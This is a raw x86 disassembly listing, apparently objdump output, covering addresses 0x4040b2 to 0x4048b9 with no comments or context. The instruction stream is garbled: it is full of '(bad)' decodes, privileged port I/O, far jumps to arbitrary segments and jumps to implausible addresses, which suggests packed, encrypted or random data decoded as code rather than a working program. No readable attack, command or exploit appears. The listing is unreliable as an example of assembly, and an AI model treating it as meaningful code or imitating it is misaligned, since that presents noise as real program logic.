  4040b2:	and    eax,0x23953f9d
  4040b7:	mov    esi,0xa16a3c84
  4040bc:	imul   ebx,DWORD PTR [esi+0x64],0x5d478336
  4040c3:	xchg   esi,eax
  4040c4:	loopne 0x4040cd
  4040c6:	inc    ebp
  4040c7:	popf   
  4040c8:	jmp    0xf580:0xba08cdaa
  4040cf:	sub    BYTE PTR [edx-0x32ce804a],0x5
  4040d6:	dec    esi
  4040d7:	mov    BYTE PTR [ebp+0x2c],bh
  4040da:	push   edi
  4040db:	ds fadd st(1),st
  4040de:	stos   DWORD PTR es:[edi],eax
  4040df:	push   eax
  4040e0:	and    eax,0x512f4f21
  4040e5:	mov    esp,0xa20772a4
  4040ea:	mov    WORD PTR [edx+0x29b66b37],ds
  4040f0:	in     al,0x24
  4040f2:	push   0xe955c63b
  4040f7:	aad    0xf7
  4040f9:	data16 xor al,BYTE PTR [ebx+0x6c]
  4040fd:	jmp    0xa5e63f4b
  404102:	xchg   edx,eax
  404103:	cli    
  404104:	sub    edx,ebp
  404106:	sub    al,0x88
  404108:	mov    ch,0xa1
  40410a:	add    bl,BYTE PTR [eax+0x65]
  40410d:	or     edx,DWORD PTR ds:0x17a7420c
  404113:	icebp  
  404114:	iret   
  404115:	shl    DWORD PTR [edx+0x7e36423b],0xc0
  40411c:	and    cl,cl
  40411e:	inc    eax
  40411f:	repz iret 
  404121:	and    dl,BYTE PTR [eax]
  404123:	addr16 jmp 0x9fb4657
  404129:	aaa    
  40412a:	xchg   esp,eax
  40412b:	fldlg2 
  40412d:	pop    esp
  40412e:	int    0xea
  404130:	jmp    0x8309:0x4cf34adf
  404137:	arpl   WORD PTR [edi+0x7f],dx
  40413a:	jecxz  0x4040da
  40413c:	test   al,0x7e
  40413e:	or     esi,DWORD PTR [eax]
  404140:	scas   al,BYTE PTR es:[edi]
  404141:	ret    0x73e1
  404144:	cmovl  eax,DWORD PTR ds:0x90a39596
  40414b:	dec    edx
  40414c:	pop    ebx
  40414d:	in     al,dx
  40414e:	mov    dl,0x12
  404150:	inc    esp
  404151:	out    0x6a,eax
  404153:	push   ds
  404154:	mov    eax,0xdc5ae247
  404159:	aaa    
  40415a:	mov    dh,0x5
  40415c:	lods   al,BYTE PTR ds:[esi]
  40415d:	je     0x404125
  40415f:	fs mov dh,0xf6
  404162:	xchg   ecx,eax
  404163:	cmp    ebp,eax
  404165:	inc    ecx
  404166:	stc    
  404167:	ins    DWORD PTR es:[edi],dx
  404168:	popa   
  404169:	into   
  40416a:	ins    DWORD PTR es:[edi],dx
  40416b:	js     0x4040ff
  40416d:	jnp    0x40418a
  40416f:	xchg   BYTE PTR [ecx+0x7d],bh
  404172:	icebp  
  404173:	pop    edx
  404174:	mov    dl,0x1e
  404176:	imul   edx,DWORD PTR [edi+0x429e70a9],0x1b
  40417d:	gs ins DWORD PTR es:[edi],dx
  40417f:	les    ebp,FWORD PTR [esi]
  404181:	inc    ebx
  404182:	push   ss
  404183:	int    0x46
  404185:	test   al,0x6d
  404187:	push   0x66d0f126
  40418c:	iret   
  40418d:	jnp    0x4041e0
  40418f:	int    0x40
  404191:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404192:	mov    esp,0xf2be3f77
  404197:	popf   
  404198:	mov    ebp,0x97a8a1f1
  40419d:	and    eax,0xb3a2eddb
  4041a2:	push   cs
  4041a3:	rcl    ecx,1
  4041a5:	daa    
  4041a6:	xchg   ebp,eax
  4041a7:	pusha  
  4041a8:	jmp    0x1fc50633
  4041ad:	mov    edx,0xa2ad721c
  4041b2:	sub    al,0x75
  4041b4:	rol    edx,cl
  4041b6:	(bad)  
  4041b7:	in     al,dx
  4041b8:	jl     0x4041f3
  4041ba:	dec    esi
  4041bb:	cmc    
  4041bc:	repz dec ebp
  4041be:	push   es
  4041bf:	cmp    DWORD PTR [edx],ecx
  4041c1:	xchg   ebx,eax
  4041c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4041c3:	cld    
  4041c4:	or     bh,dh
  4041c6:	mov    bl,0x39
  4041c8:	mov    ds:0xb1a09188,eax
  4041cd:	repnz fwait
  4041cf:	or     eax,0xc5160e63
  4041d4:	mov    eax,0x5a5a7995
  4041d9:	hlt    
  4041da:	adc    BYTE PTR [esi],al
  4041dc:	js     0x4041d8
  4041de:	pop    ds
  4041df:	or     al,BYTE PTR [edi+eax*2-0x40]
  4041e3:	inc    ecx
  4041e4:	pop    ds
  4041e5:	out    0x41,al
  4041e7:	(bad)
  4041ea:	push   0xbfc27af
  4041ef:	adc    DWORD PTR [edx],edi
  4041f1:	mov    eax,0x13c14134
  4041f6:	bound  esp,QWORD PTR [edx]
  4041f8:	or     BYTE PTR [esi-0x1aeeb6d6],bl
  4041fe:	ins    DWORD PTR es:[edi],dx
  4041ff:	fucomp st(2)
  404201:	jb     0x404247
  404203:	ror    DWORD PTR [esi+0x5a69ef3f],cl
  404209:	adc    eax,0xc9fc4db9
  40420e:	adc    BYTE PTR [edx],ah
  404210:	or     DWORD PTR gs:[ebp-0x30],eax
  404214:	je     0x40424b
  404216:	pop    ss
  404217:	and    dl,BYTE PTR [esi-0x1b]
  40421a:	mov    eax,0x479fcb14
  40421f:	fiadd  DWORD PTR ds:0x981ab9c7
  404225:	sahf   
  404226:	in     al,dx
  404227:	pop    esp
  404228:	aas    
  404229:	(bad)  
  40422a:	jg     0x40422f
  40422c:	xor    BYTE PTR [esi+eax*1],al
  40422f:	xchg   ebx,eax
  404230:	dec    eax
  404231:	loope  0x4041c6
  404233:	aaa    
  404234:	push   esi
  404235:	cmp    dl,bh
  404237:	xor    al,0x31
  404239:	dec    ebp
  40423a:	(bad)  
  40423b:	fadd   DWORD PTR [edi]
  40423d:	or     eax,DWORD PTR [ebp+0x6b554dab]
  404243:	mov    BYTE PTR [ebx],ch
  404245:	mov    edx,0x295bdf4a
  40424a:	xchg   esp,eax
  40424b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40424c:	(bad)  
  40424d:	mov    ebp,0xaec57cb0
  404252:	outs   dx,DWORD PTR ds:[esi]
  404253:	and    ebx,DWORD PTR [esi-0x6087dd87]
  404259:	sbb    DWORD PTR [ebx+0x4d57e55d],eax
  40425f:	push   esp
  404260:	ss jle 0x40421c
  404263:	sbb    esp,ecx
  404265:	cwde   
  404266:	xor    edi,edi
  404268:	jmp    0xe72b8ce7
  40426d:	inc    esp
  40426e:	pop    ecx
  40426f:	ss adc bh,cl
  404272:	mov    eax,ds:0x3da9fb
  404277:	leave  
  404278:	repz out dx,al
  40427a:	into   
  40427b:	repz mov bl,0xea
  40427e:	jbe    0x4042d4
  404280:	icebp  
  404281:	push   ecx
  404282:	fwait
  404283:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404284:	push   edx
  404285:	icebp  
  404286:	sub    al,0x88
  404288:	shl    BYTE PTR [edx-0x13776c56],1
  40428e:	repnz scas eax,DWORD PTR es:[edi]
  404290:	xchg   edx,eax
  404291:	(bad)  
  404292:	rcl    DWORD PTR [ecx-0x7234ee6d],0x4c
  404299:	stos   DWORD PTR es:[edi],eax
  40429a:	sub    ecx,DWORD PTR [ebp-0x77da7c7c]
  4042a0:	and    eax,0x5e3e38f9
  4042a5:	in     al,dx
  4042a6:	(bad)  
  4042a7:	adc    edx,DWORD PTR [ebx-0x1f]
  4042aa:	popf   
  4042ab:	sub    DWORD PTR [ebx],esp
  4042ad:	clc    
  4042ae:	inc    DWORD PTR [eax+0x1d06a32d]
  4042b4:	xor    bl,BYTE PTR [ebp-0x19050886]
  4042ba:	in     al,0xfe
  4042bc:	xor    al,0x85
  4042be:	dec    esi
  4042bf:	push   0xfffffffc
  4042c1:	sub    al,0xbb
  4042c3:	mov    cl,0x37
  4042c5:	sbb    DWORD PTR [ebp+0x3e755e5a],0xffffffd3
  4042cc:	es xor esi,edi
  4042cf:	pop    ebp
  4042d0:	inc    edx
  4042d1:	cmp    BYTE PTR [ecx],cl
  4042d3:	sub    BYTE PTR [eax],bl
  4042d5:	stos   BYTE PTR es:[edi],al
  4042d6:	mul    DWORD PTR [esi+edx*4-0x7077e36f]
  4042dd:	(bad)  
  4042de:	call   0x2b08e329
  4042e3:	fnsave ds:0x9ac18d05
  4042e9:	data16 mov dh,0x34
  4042ec:	lds    ecx,FWORD PTR [esi+0x6c2e075d]
  4042f2:	mov    ch,0x6d
  4042f4:	xlat   BYTE PTR ds:[ebx]
  4042f5:	add    eax,0x85da1f17
  4042fa:	mov    bl,0xb7
  4042fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4042fd:	pop    esi
  4042fe:	int3   
  4042ff:	(bad)  
  404300:	out    0xaf,al
  404302:	(bad)  
  404303:	outs   dx,DWORD PTR ds:[esi]
  404304:	mov    ds:0x3e5fb486,al
  404309:	xor    edx,DWORD PTR [ebx]
  40430b:	fdivr  DWORD PTR [esi+0x375b34ed]
  404311:	sbb    esp,edi
  404313:	add    al,0x14
  404315:	dec    ebp
  404316:	bound  esp,QWORD PTR [ebp+0x178a658]
  40431c:	xor    DWORD PTR [edx-0x3],eax
  40431f:	push   edx
  404320:	in     eax,0xdb
  404322:	aam    0x2c
  404324:	push   edx
  404325:	mov    bh,0x44
  404327:	push   esi
  404328:	adc    al,0xc3
  40432a:	xchg   ecx,eax
  40432b:	xchg   ecx,eax
  40432c:	mov    ecx,0xedb3548e
  404331:	shr    DWORD PTR [edx],cl
  404333:	add    esp,edi
  404335:	in     eax,0x63
  404337:	add    al,0xaa
  404339:	adc    al,0x56
  40433b:	out    0xc1,al
  40433d:	fst    QWORD PTR [ebp+0x1838e8e8]
  404343:	retf   0xb566
  404346:	fist   WORD PTR [ebx-0x6787fd13]
  40434c:	enter  0x1338,0x6
  404350:	lahf   
  404351:	fwait
  404352:	das    
  404353:	jbe    0x4043cd
  404355:	fidivr WORD PTR [ebp+0x4d]
  404358:	jmp    0xd42bb556
  40435d:	pop    ds
  40435e:	jae    0x404369
  404360:	test   ah,0x33
  404363:	dec    ecx
  404364:	add    cl,bh
  404366:	push   ss
  404367:	or     al,0xf8
  404369:	aam    0x33
  40436b:	cli    
  40436c:	mov    al,ds:0xbbdef4ab
  404371:	fdiv   QWORD PTR [edi+0x277ace2b]
  404377:	xor    ah,al
  404379:	or     edi,ecx
  40437b:	add    ah,BYTE PTR [esi]
  40437d:	jnp    0x4043f7
  40437f:	pop    ebx
  404380:	push   ebx
  404381:	add    DWORD PTR [ebx],esp
  404383:	xchg   DWORD PTR [ebp+0x26],edi
  404386:	inc    ebp
  404387:	(bad)  
  404388:	xor    BYTE PTR [ecx],ah
  40438a:	lock mov eax,ds:0x4dd75c8d
  404390:	into   
  404391:	sbb    esi,ebx
  404393:	shl    DWORD PTR ds:0xce55fba,cl
  404399:	push   cs
  40439a:	push   cs
  40439b:	xchg   edi,eax
  40439c:	shr    DWORD PTR [edx+0x7641793c],0x1e
  4043a3:	adc    BYTE PTR [ebx+0x1a3fa2d7],bl
  4043a9:	sub    eax,0x942371c6
  4043ae:	xor    cl,BYTE PTR [ecx]
  4043b0:	xor    eax,0xc17978d4
  4043b5:	adc    esi,ebp
  4043b7:	xchg   ecx,eax
  4043b8:	int3   
  4043b9:	lods   al,BYTE PTR ds:[esi]
  4043ba:	xlat   BYTE PTR ds:[ebx]
  4043bb:	pushf  
  4043bc:	sub    BYTE PTR [ecx-0x56f71fa9],bh
  4043c2:	cmp    WORD PTR [eax+0x6d],cx
  4043c6:	outs   dx,BYTE PTR ds:[esi]
  4043c7:	mov    bh,0x60
  4043c9:	daa    
  4043ca:	cmp    al,BYTE PTR ds:0xcdb51108
  4043d0:	sbb    DWORD PTR [ebx+eiz*4-0x75],0xffffffb5
  4043d5:	(bad)  
  4043d6:	aam    0xa6
  4043d8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4043d9:	shr    BYTE PTR [ebx+0x40eefd6e],cl
  4043df:	pop    eax
  4043e0:	jp     0x40441c
  4043e2:	in     al,0xd4
  4043e4:	mov    dl,0x5f
  4043e6:	xor    al,0xd9
  4043e8:	stos   BYTE PTR es:[edi],al
  4043e9:	jmp    0x404397
  4043eb:	mov    bh,BYTE PTR [esi-0x1dac9847]
  4043f1:	mov    dh,BYTE PTR [edx]
  4043f3:	gs jmp 0xfaa3:0x1c97d5ab
  4043fb:	or     cl,BYTE PTR [ebp-0x47]
  4043fe:	data16 xlat BYTE PTR ds:[ebx]
  404400:	daa    
  404401:	and    dh,BYTE PTR [esi+0x8]
  404404:	or     DWORD PTR [ebx],0x61fe2c03
  40440a:	fadd   st(0),st
  40440c:	ret    
  40440d:	adc    al,0xc0
  40440f:	stos   DWORD PTR es:[edi],eax
  404410:	ror    BYTE PTR [eax-0x29],0x93
  404414:	jns    0x40445e
  404416:	and    eax,esp
  404418:	imul   ebp,edx,0x1f
  40441b:	pop    esi
  40441c:	add    ebx,DWORD PTR [edi]
  40441e:	gs (bad) 
  404421:	ret    
  404422:	push   eax
  404423:	add    esi,DWORD PTR ds:0x4e2de5da
  404429:	or     DWORD PTR [eax+0x56a3fb19],esp
  40442f:	sbb    edi,edi
  404431:	loopne 0x40449b
  404433:	rol    BYTE PTR [ebx],1
  404435:	dec    BYTE PTR [ecx-0x1a387f72]
  40443b:	inc    ecx
  40443c:	add    eax,0x9232b5b5
  404441:	out    0xdc,eax
  404443:	(bad)  
  404444:	aas    
  404445:	rcl    BYTE PTR [edx],cl
  404447:	clc    
  404448:	jne    0x404454
  40444a:	inc    ecx
  40444b:	les    ecx,FWORD PTR [ebx+0x64]
  40444e:	(bad)  
  40444f:	xor    al,0x4b
  404451:	adc    eax,0x6204385c
  404456:	shl    DWORD PTR [esi],1
  404458:	mul    BYTE PTR [ebp+0x3247a0dd]
  40445e:	sub    bh,BYTE PTR [ebx+0x42]
  404461:	push   0x500f430d
  404466:	jmp    0x4044d2
  404468:	jg     0x4044e7
  40446a:	mov    ch,0xde
  40446c:	int    0x34
  40446e:	mov    ah,0x8
  404470:	adc    BYTE PTR [eax+0x5a84dfc],bh
  404476:	cmp    bh,BYTE PTR [eax-0x3a]
  404479:	shr    DWORD PTR [edi],1
  40447b:	sub    cl,ch
  40447d:	add    DWORD PTR [ebp+0x68],esp
  404480:	add    ch,BYTE PTR [eax+0x42]
  404483:	clc    
  404484:	daa    
  404485:	stos   DWORD PTR es:[edi],eax
  404486:	add    BYTE PTR [esi],dl
  404488:	std    
  404489:	pop    edi
  40448a:	pop    edx
  40448b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40448c:	inc    esi
  40448d:	mov    dh,0x32
  40448f:	out    0x29,eax
  404491:	push   ecx
  404492:	out    dx,eax
  404493:	in     al,dx
  404494:	aam    0xed
  404496:	and    eax,0xe2e09021
  40449b:	mov    edx,0xb8ace274
  4044a0:	fiadd  WORD PTR [esp+edx*2-0x58]
  4044a4:	imul   ecx,DWORD PTR [esi-0x4d],0x62cc9e38
  4044ab:	cs pop ss
  4044ad:	sahf   
  4044ae:	and    DWORD PTR [esi],eax
  4044b0:	mov    edx,0x206c97ff
  4044b5:	ret    0x4208
  4044b8:	mov    edi,0x396edee0
  4044bd:	inc    ebp
  4044be:	pop    ds
  4044bf:	xor    DWORD PTR ds:0x65178c63,ebx
  4044c5:	jg     0x404491
  4044c7:	nop
  4044c8:	stc    
  4044c9:	mov    dh,0xe6
  4044cb:	mov    WORD PTR [edx+0x33fb0313],?
  4044d1:	pop    ss
  4044d2:	gs in  eax,dx
  4044d4:	sti    
  4044d5:	out    0xb6,al
  4044d7:	push   esp
  4044d8:	aas    
  4044d9:	aad    0x7a
  4044db:	sahf   
  4044dc:	fsub   st(2),st
  4044de:	rcr    DWORD PTR [ebx],1
  4044e0:	add    esi,DWORD PTR [edx-0x51]
  4044e3:	jp     0x4044fb
  4044e5:	sahf   
  4044e6:	jne    0x404544
  4044e8:	loop   0x404523
  4044ea:	and    eax,0x787bdbb1
  4044ef:	push   0xd3e33d06
  4044f4:	sbb    al,0x76
  4044f6:	or     bl,bl
  4044f8:	(bad)  
  4044f9:	mov    ch,0xd9
  4044fb:	imul   ecx,DWORD PTR [edi],0x2a
  4044fe:	cmp    ebx,ebp
  404500:	mov    eax,0x6ac436e6
  404505:	fwait
  404506:	loope  0x404557
  404508:	xchg   ecx,eax
  404509:	inc    edx
  40450a:	and    al,0xdf
  40450c:	js     0x404539
  40450e:	test   al,0x53
  404510:	add    al,BYTE PTR [ecx]
  404512:	and    ebx,DWORD PTR [ebp+edi*1-0x66]
  404516:	add    al,0x1e
  404518:	lds    esp,FWORD PTR [esi+0x26]
  40451b:	pop    ds
  40451c:	clc    
  40451d:	or     ebp,esi
  40451f:	or     cx,cx
  404522:	dec    eax
  404523:	adc    al,0xb7
  404525:	stc    
  404526:	mov    ds:0xf7c63a21,al
  40452b:	je     0x404556
  40452d:	cmp    ah,al
  40452f:	call   0x5f83:0x16be8d93
  404536:	pop    DWORD PTR [esi+0x67]
  404539:	in     eax,0x5f
  40453b:	inc    edi
  40453c:	fcomp  QWORD PTR [ebx-0x5b]
  40453f:	add    DWORD PTR [ebx],0x111008d0
  404545:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404546:	and    edi,DWORD PTR [edi-0x7e6b71af]
  40454c:	(bad)  
  40454d:	mov    ds:0x762e51e2,al
  404552:	jnp    0x4044d5
  404554:	popf   
  404555:	mov    gs,WORD PTR [edi-0x39eca539]
  40455b:	test   eax,0x53c03444
  404560:	push   0x8ceee9c7
  404565:	stos   BYTE PTR es:[edi],al
  404566:	rol    DWORD PTR [ebp-0x156d8791],1
  40456c:	aad    0x61
  40456e:	add    al,0xac
  404570:	enter  0x8572,0xab
  404574:	push   ds
  404575:	pop    esi
  404576:	in     al,dx
  404577:	(bad)  
  404578:	fiadd  WORD PTR [ecx-0xc8cda3d]
  40457e:	mov    ebx,0x22c6e0bf
  404583:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404584:	cmp    DWORD PTR [edi-0x7a48c129],0xe13a115b
  40458e:	sbb    al,BYTE PTR [ebx]
  404590:	imul   ebp,DWORD PTR [edx-0x6469be37],0x59
  404597:	pop    esi
  404598:	mov    al,ds:0x6332eb27
  40459d:	xchg   edx,eax
  40459e:	mov    ds:0x78a6ee4d,eax
  4045a3:	xchg   ecx,eax
  4045a4:	pusha  
  4045a5:	push   edx
  4045a6:	mov    ebx,0xe22ed8ec
  4045ab:	push   0xf84e9798
  4045b0:	cld    
  4045b1:	cmp    eax,0x476ed9d9
  4045b6:	(bad)  
  4045b7:	(bad)  
  4045b8:	add    DWORD PTR ds:0x42a4cdc0,edx
  4045be:	bound  ecx,QWORD PTR [edi]
  4045c0:	add    eax,DWORD PTR [ecx+0x62]
  4045c3:	or     DWORD PTR [ecx],edx
  4045c5:	sub    al,0x3
  4045c7:	imul   ebp,DWORD PTR [esi+0x4a],0x75
  4045cb:	iret   
  4045cc:	mov    edx,0xdb97d2d
  4045d1:	loopne 0x404642
  4045d3:	scas   eax,DWORD PTR es:[edi]
  4045d4:	adc    BYTE PTR [edi],dl
  4045d6:	pop    ebp
  4045d7:	ss jcxz 0x40457e
  4045db:	(bad)  [esi]
  4045dd:	shr    al,0x9d
  4045e0:	push   ss
  4045e1:	mov    ebp,0xff1fe593
  4045e6:	push   eax
  4045e7:	mov    ch,0x3
  4045e9:	adc    DWORD PTR [ecx-0x463e688f],eax
  4045ef:	sti    
  4045f0:	push   ss
  4045f1:	sub    al,0xf1
  4045f3:	sti    
  4045f4:	shr    DWORD PTR [ecx],1
  4045f6:	gs stos DWORD PTR es:[edi],eax
  4045f8:	cmp    ecx,DWORD PTR [ecx+0x55dcf48d]
  4045fe:	pop    ss
  4045ff:	popa   
  404600:	mov    eax,0xe0223049
  404605:	test   eax,0xa76a5717
  40460a:	xchg   edi,eax
  40460b:	adc    dl,BYTE PTR [ebp+0x58]
  40460e:	pop    ebp
  40460f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404610:	loope  0x4045ef
  404612:	inc    esp
  404613:	retf   
  404614:	xchg   edx,eax
  404615:	jge    0x40464f
  404617:	mov    cl,0x97
  404619:	and    bh,BYTE PTR ds:0x2b09ce09
  40461f:	dec    ebx
  404620:	sub    eax,0x9b8a0cda
  404625:	mov    ch,0xb0
  404627:	sub    ah,BYTE PTR [ebx-0x14]
  40462a:	mov    al,0xd9
  40462c:	or     al,0x70
  40462e:	out    dx,al
  40462f:	sbb    bl,BYTE PTR [ecx-0xe]
  404632:	or     esp,DWORD PTR [edx-0x4e0b08a2]
  404638:	dec    ecx
  404639:	pop    ecx
  40463a:	cmp    eax,0xd003ef6
  40463f:	xchg   esi,eax
  404640:	push   esi
  404641:	stc    
  404642:	daa    
  404643:	adc    dl,BYTE PTR [ebx-0x6d]
  404646:	es loopne 0x4045cd
  404649:	out    0x71,al
  40464b:	mov    ch,0x4
  40464d:	cmp    eax,0x141f2473
  404652:	outs   dx,DWORD PTR ds:[esi]
  404653:	mov    edi,0xcc9c3e9d
  404658:	mov    ds:0x6818d78a,eax
  40465d:	xchg   edx,eax
  40465e:	dec    eax
  40465f:	jp     0x404641
  404661:	lods   eax,DWORD PTR ds:[esi]
  404662:	fcmovu st,st(4)
  404664:	loope  0x40466d
  404666:	(bad)  
  404667:	mov    ebx,0x4634e12c
  40466c:	je     0x4046e0
  40466e:	add    al,0x6a
  404670:	lds    edx,FWORD PTR [eax+0x4b]
  404673:	cli    
  404674:	push   0x37c773dd
  404679:	cmp    dl,BYTE PTR [edi]
  40467b:	sub    ecx,DWORD PTR [edi-0x5227325e]
  404681:	in     al,dx
  404682:	dec    esi
  404683:	lea    ecx,[edi+0xaee7f59]
  404689:	std    
  40468a:	repnz inc esp
  40468c:	push   eax
  40468d:	mov    ah,0x28
  40468f:	sar    ch,cl
  404691:	sbb    ebx,eax
  404693:	jecxz  0x404698
  404695:	mov    cl,0xdc
  404697:	arpl   di,dx
  404699:	mov    ch,0xd2
  40469b:	mov    dh,0x80
  40469d:	pop    eax
  40469e:	push   0xffffff9a
  4046a0:	out    dx,eax
  4046a1:	call   0xb6a48bd1
  4046a6:	mov    edi,DWORD PTR [edx+ebp*8+0x6e4c4053]
  4046ad:	popf   
  4046ae:	cs xor al,0xaa
  4046b1:	xlat   BYTE PTR es:[ebx]
  4046b3:	push   edx
  4046b4:	test   al,0x68
  4046b6:	and    al,0x6b
  4046b8:	popa   
  4046b9:	outs   dx,BYTE PTR ds:[esi]
  4046ba:	scas   eax,DWORD PTR es:[edi]
  4046bb:	and    bl,BYTE PTR [edi]
  4046bd:	mov    edx,0x3340e154
  4046c2:	in     eax,dx
  4046c3:	mov    ebx,0xbb2ebca
  4046c8:	add    al,BYTE PTR [esi+ebx*4+0x67abbe33]
  4046cf:	push   ds
  4046d0:	or     al,0x2f
  4046d2:	cli    
  4046d3:	repnz fsubr st,st(1)
  4046d6:	add    bl,dh
  4046d8:	div    BYTE PTR [eax]
  4046da:	stc    
  4046db:	addr16 jae 0x4046bf
  4046de:	cmp    al,0xb2
  4046e0:	leave  
  4046e1:	push   ebp
  4046e2:	and    eax,0x3617eabb
  4046e7:	retf   0xf8bd
  4046ea:	jo     0x404690
  4046ec:	repz jo 0x404677
  4046ef:	mov    bh,BYTE PTR [ecx]
  4046f1:	fsub   QWORD PTR gs:[eax-0x165359aa]
  4046f8:	dec    ebx
  4046f9:	data16 mov BYTE PTR [edi],ah
  4046fc:	(bad)  
  4046fe:	adc    BYTE PTR [edi+0x49],cl
  404701:	stos   BYTE PTR es:[edi],al
  404702:	sub    DWORD PTR [eax+eiz*4],0x121aae91
  404709:	push   ebp
  40470a:	(bad)  
  40470b:	mov    edx,0x2b96b1b0
  404710:	(bad)  
  404711:	mov    ds:0x150036b4,al
  404716:	push   ecx
  404717:	(bad)  
  404718:	fcom   QWORD PTR [esi+0x30f1159d]
  40471e:	dec    ecx
  40471f:	mov    edx,0xebaeb51c
  404724:	jmp    0x404700
  404726:	jae    0x404738
  404728:	(bad)
  40472b:	fxch   st(3)
  40472d:	lods   eax,DWORD PTR ds:[esi]
  40472e:	lock pop ds
  404730:	or     eax,esp
  404732:	xor    al,0x19
  404734:	dec    ebp
  404735:	std    
  404736:	cmp    ch,dh
  404738:	push   edx
  404739:	daa    
  40473a:	idiv   DWORD PTR [esi-0xf]
  40473d:	adc    BYTE PTR [ebx-0x3b],ah
  404740:	sub    al,0xcf
  404742:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404743:	mov    bl,0xa
  404745:	lods   eax,DWORD PTR ds:[esi]
  404746:	dec    edx
  404747:	sub    edx,eax
  404749:	ret    
  40474a:	in     eax,dx
  40474b:	mov    WORD PTR [edi-0x4c],cs
  40474e:	aaa    
  40474f:	pop    ebp
  404750:	mov    ax,ds:0x5f931f1
  404756:	in     al,dx
  404757:	jge    0x404717
  404759:	cmp    DWORD PTR [ecx-0x39],ebx
  40475c:	jno    0x404739
  40475e:	mov    bl,cl
  404760:	int3   
  404761:	das    
  404762:	or     al,0x6e
  404764:	mov    al,0x22
  404766:	jg     0x4047a3
  404768:	xor    bh,BYTE PTR [ecx]
  40476a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40476b:	ja     0x404761
  40476d:	jno    0x404789
  40476f:	inc    edi
  404770:	fwait
  404771:	pop    es
  404772:	push   0xffffffc0
  404774:	repz scas al,BYTE PTR es:[edi]
  404776:	stos   BYTE PTR es:[edi],al
  404777:	pushf  
  404778:	add    BYTE PTR [di+0x7ad5],al
  40477d:	dec    edx
  40477e:	jmp    0x1a54:0xa6d76a39
  404785:	xchg   edi,eax
  404787:	or     ecx,eax
  404789:	inc    ecx
  40478a:	push   ebp
  40478b:	xchg   ebx,eax
  40478c:	push   si
  40478e:	cmp    dh,0x2c
  404791:	add    bl,bh
  404793:	shl    BYTE PTR [esi+0x64103c7e],0xc7
  40479a:	in     eax,0x31
  40479c:	adc    BYTE PTR ds:0x7aca738,0xff
  4047a3:	ror    BYTE PTR [ebp+0x6a],0xda
  4047a7:	sub    al,0x25
  4047a9:	sub    DWORD PTR [edi],esi
  4047ab:	test   eax,0x7ad9d38d
  4047b0:	les    ebx,FWORD PTR [edx-0x1e5bfd08]
  4047b6:	fcom   st(0)
  4047b8:	sub    eax,0x343ecc8
  4047bd:	sub    al,0x57
  4047bf:	sub    cl,BYTE PTR [edx-0x31e86ac2]
  4047c5:	add    BYTE PTR ss:[eax-0x3e],al
  4047c9:	dec    edx
  4047ca:	dec    ebp
  4047cc:	scas   al,BYTE PTR es:[edi]
  4047cd:	pop    ebp
  4047ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4047cf:	adc    edi,DWORD PTR [esi+0x2e]
  4047d2:	std    
  4047d3:	out    0x3f,eax
  4047d5:	aas    
  4047d6:	cmp    ebp,edi
  4047d8:	sub    bh,BYTE PTR [edi+0x45]
  4047db:	xor    al,0xdb
  4047dd:	mov    eax,ds:0x4f36f809
  4047e2:	aam    0x82
  4047e4:	imul   edx,DWORD PTR [ebx+0xb64c5d7],0xa3484ab4
  4047ee:	xchg   ebp,eax
  4047ef:	mov    eax,0x82cbe258
  4047f4:	jne    0x404862
  4047f6:	sbb    al,0x2b
  4047f8:	fs mov ebp,0x5b3a67de
  4047fe:	jmp    0x4312:0x2ce75eb9
  404805:	add    al,0x67
  404807:	je     0x404828
  404809:	push   esi
  40480a:	mov    eax,0x78c2c32a
  40480f:	ss ja  0x4047a0
  404812:	movq   mm3,mm7
  404815:	jb     0x404860
  404817:	arpl   WORD PTR [ebx-0x46],sp
  40481a:	test   al,0x3d
  40481c:	(bad)  
  40481d:	cmc    
  40481e:	jle    0x40486e
  404820:	fs es pop edi
  404823:	test   al,0x61
  404825:	adc    al,0x54
  404827:	mov    BYTE PTR [edi+0x25],dh
  40482a:	ins    BYTE PTR es:[edi],dx
  40482b:	add    DWORD PTR [eax-0x46],ecx
  40482e:	mov    dh,al
  404830:	jno    0x404851
  404832:	sahf   
  404833:	cmp    al,0x38
  404835:	(bad)  
  404836:	iret   
  404837:	sbb    eax,0x85ccfa44
  40483c:	jnp    0x404825
  40483e:	xor    eax,0x82b1efc1
  404843:	cdq    
  404844:	adc    edi,DWORD PTR [ebx]
  404846:	addr16 push ds
  404848:	xor    esp,DWORD PTR [edx+edx*2]
  40484b:	or     DWORD PTR [edx+0x9c8c45b],esp
  404851:	sub    edi,DWORD PTR ds:0x1327c64
  404857:	sub    BYTE PTR [edx-0x5e3b89b4],al
  40485d:	jmp    0x40489c
  40485f:	popf   
  404860:	pop    eax
  404861:	mov    al,ss:0x16dddde8
  404867:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404868:	nop
  404869:	cs pop edi
  40486b:	or     al,0x3e
  40486d:	xchg   edi,eax
  40486e:	fs sbb eax,0x7428bb76
  404874:	cwde   
  404875:	frstpm(287 only) 
  404877:	mov    edi,0xf616cd45
  40487c:	lock and al,BYTE PTR [ebp+0x23]
  404880:	fist   DWORD PTR [edi-0x137b5092]
  404886:	call   0x8f45992
  40488b:	popa   
  40488c:	lods   al,BYTE PTR ds:[esi]
  40488d:	mov    esi,0x90aeee9
  404892:	and    ebp,ecx
  404894:	ja     0x404899
  404896:	sbb    al,0x8d
  404898:	pop    ss
  404899:	mov    ebx,0xea9aab37
  40489e:	(bad)  
  40489f:	mov    dl,0xe1
  4048a1:	mov    ah,0x82
  4048a3:	mov    al,ds:0x51e1a485
  4048a8:	jge    0x4048df
  4048aa:	mov    ebp,0xa76bf4dc
  4048af:	fcomp  st(4)
  4048b1:	jmp    FWORD PTR ds:0x30075924
  4048b7:	int    0x93
  4048b9:	mov    DWORD PTR [edi-0x3b],esp
